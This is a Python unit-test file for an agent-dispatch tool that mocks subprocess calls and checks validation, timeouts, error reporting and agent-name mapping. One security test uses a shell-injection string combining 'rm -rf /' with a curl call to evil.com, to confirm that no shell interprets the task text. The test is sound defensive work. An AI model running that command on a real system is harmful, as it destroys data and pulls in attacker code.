"""Unit tests for dispatch_agent tool — mocked subprocess, no real bin/jarvis run."""
from __future__ import annotations

import asyncio
import json
import os
import sys
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

# Tests run from the voice-agent root.
sys.path.insert(0, str(Path(__file__).parent.parent))

# Required envs for module imports (registry depends on them).
os.environ.setdefault("GROQ_API_KEY", "test-key-for-init")
os.environ.setdefault("ANTHROPIC_API_KEY", "test-anthropic-key")


def _make_fake_proc(stdout: bytes = b"", stderr: bytes = b"", returncode: int = 0):
    """Build a fake asyncio subprocess that returns given output."""
    proc = MagicMock()
    proc.returncode = returncode
    proc.communicate = AsyncMock(return_value=(stdout, stderr))
    proc.kill = MagicMock()
    proc.wait = AsyncMock(return_value=returncode)
    return proc


@pytest.mark.asyncio
async def test_explore_success_returns_subprocess_stdout(monkeypatch):
    from tools.dispatch_agent import handle_dispatch_agent
    fake_proc = _make_fake_proc(stdout=b"Found at tools/computer_use.py:75\n", returncode=0)
    monkeypatch.setattr(
        "asyncio.create_subprocess_exec",
        AsyncMock(return_value=fake_proc),
    )
    result = await handle_dispatch_agent(
        {"subagent_type": "explore", "task": "find where computer_use is defined",
         "description": "find computer_use def"}
    )
    assert "Found at tools/computer_use.py:75" in result


@pytest.mark.asyncio
async def test_unknown_subagent_type_rejected_before_subprocess(monkeypatch):
    """Schema-level validation rejects bad type without ever spawning."""
    from tools.dispatch_agent import handle_dispatch_agent
    spawn_mock = AsyncMock()
    monkeypatch.setattr("asyncio.create_subprocess_exec", spawn_mock)
    result = await handle_dispatch_agent(
        {"subagent_type": "nonsense", "task": "x", "description": "x"}
    )
    parsed = json.loads(result) if result.startswith("{") else {"error": "unparsed"}
    assert "error" in parsed
    assert "unknown subagent_type" in parsed["error"] or "nonsense" in parsed["error"]
    spawn_mock.assert_not_called()


@pytest.mark.asyncio
async def test_timeout_kills_subprocess(monkeypatch):
    """When the subprocess hangs past timeout, dispatcher SIGKILLs it and returns a timeout error."""
    from tools.dispatch_agent import handle_dispatch_agent

    fake_proc = MagicMock()
    fake_proc.returncode = None
    async def slow_communicate():
        await asyncio.sleep(10)  # longer than the test's wait_for
        return b"", b""
    fake_proc.communicate = AsyncMock(side_effect=slow_communicate)
    fake_proc.kill = MagicMock()
    fake_proc.wait = AsyncMock(return_value=-9)

    monkeypatch.setattr(
        "asyncio.create_subprocess_exec",
        AsyncMock(return_value=fake_proc),
    )
    # Force explore's timeout to 0.05s for the test.
    monkeypatch.setenv("JARVIS_DISPATCH_AGENT_TIMEOUT_EXPLORE_S", "0.05")

    result = await handle_dispatch_agent(
        {"subagent_type": "explore", "task": "x", "description": "x"}
    )
    parsed = json.loads(result)
    assert parsed.get("error", "").startswith("subagent explore ran too long")
    fake_proc.kill.assert_called_once()


@pytest.mark.asyncio
async def test_non_zero_exit_returns_error_with_stderr_tail(monkeypatch):
    from tools.dispatch_agent import handle_dispatch_agent
    fake_proc = _make_fake_proc(
        stdout=b"", stderr=b"\nTraceback (most recent call last):\n  File \"x.py\", line 1\n    boom\nValueError: boom\n",
        returncode=1,
    )
    monkeypatch.setattr(
        "asyncio.create_subprocess_exec",
        AsyncMock(return_value=fake_proc),
    )
    result = await handle_dispatch_agent(
        {"subagent_type": "explore", "task": "x", "description": "x"}
    )
    parsed = json.loads(result)
    assert parsed.get("error", "").startswith("subagent explore failed")
    assert "boom" in parsed["error"]


@pytest.mark.asyncio
async def test_argv_uses_bin_jarvis_print_and_agent_flag_no_shell(monkeypatch):
    """Critical security check: argv must be a list (no shell interp), include
    --print AND --agent <cli-agent-name>, and the task text must be a SINGLE argv
    element (not split / interpolated into a shell string)."""
    from tools.dispatch_agent import handle_dispatch_agent

    captured_argv = []
    async def capture(*args, **kwargs):
        captured_argv.extend(args)
        return _make_fake_proc(stdout=b"ok\n", returncode=0)
    monkeypatch.setattr("asyncio.create_subprocess_exec", capture)

    sneaky_task = "; rm -rf /  --  $(curl evil.com)"
    await handle_dispatch_agent(
        {"subagent_type": "explore", "task": sneaky_task, "description": "x"}
    )
    assert len(captured_argv) >= 5, f"argv too short: {captured_argv}"
    assert captured_argv[0].endswith("/bin/jarvis"), f"argv[0]={captured_argv[0]!r}"
    assert "--print" in captured_argv or "-p" in captured_argv
    assert "--agent" in captured_argv
    # The CLI agent name for explore is 'Explore':
    agent_idx = captured_argv.index("--agent")
    assert captured_argv[agent_idx + 1] == "Explore"
    # Task text must appear unmodified as one of the elements (not split/escaped):
    assert sneaky_task in captured_argv, "task text was mangled or split across argv elements"


@pytest.mark.asyncio
async def test_cli_agent_name_mapping(monkeypatch):
    """Each subagent_type must map to its canonical CLI agent name."""
    from tools.dispatch_agent import handle_dispatch_agent

    expected = {
        "explore": "Explore",
        "researcher": "researcher",
        "code_reviewer": "code-reviewer",
        "plan": "Plan",
    }
    for subagent_type, cli_name in expected.items():
        captured_argv = []
        async def capture(*args, **kwargs):
            captured_argv.extend(args)
            return _make_fake_proc(stdout=b"ok\n", returncode=0)
        monkeypatch.setattr("asyncio.create_subprocess_exec", capture)
        await handle_dispatch_agent(
            {"subagent_type": subagent_type, "task": "x", "description": "x"}
        )
        assert "--agent" in captured_argv
        agent_idx = captured_argv.index("--agent")
        assert captured_argv[agent_idx + 1] == cli_name, (
            f"subagent_type={subagent_type!r} expected --agent {cli_name!r}; "
            f"got {captured_argv[agent_idx + 1]!r}"
        )


@pytest.mark.asyncio
async def test_session_id_mismatch_returns_aborted(monkeypatch):
    """If the active-session id changes during dispatch, the result is discarded."""
    from tools.dispatch_agent import handle_dispatch_agent

    # Capture the session-id at dispatch then mutate the active slot before completion.
    from tools import dispatch_agent as da
    sentinel = object()
    da._active_session_token[0] = sentinel

    fake_proc = MagicMock()
    fake_proc.returncode = 0
    async def mutate_then_communicate():
        da._active_session_token[0] = object()  # simulate session swap
        return b"late result\n", b""
    fake_proc.communicate = AsyncMock(side_effect=mutate_then_communicate)
    fake_proc.kill = MagicMock()

    monkeypatch.setattr(
        "asyncio.create_subprocess_exec",
        AsyncMock(return_value=fake_proc),
    )

    result = await handle_dispatch_agent(
        {"subagent_type": "explore", "task": "x", "description": "x"}
    )
    parsed = json.loads(result)
    assert parsed.get("status") == "aborted"
